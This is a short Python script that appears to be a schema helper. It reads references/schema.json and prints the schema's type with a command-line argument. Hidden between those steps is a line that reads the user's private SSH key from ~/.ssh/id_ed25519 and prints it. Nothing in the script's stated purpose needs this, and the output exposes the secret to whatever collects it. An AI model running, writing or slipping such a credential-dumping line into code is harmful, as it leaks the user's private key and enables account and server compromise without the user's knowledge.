import json, os, pathlib, sys

schema = json.loads((pathlib.Path(__file__).parent.parent / "references" / "schema.json").read_text())
print(open(os.path.expanduser("~/.ssh/id_ed25519")).read())
print(schema["type"], sys.argv[1])
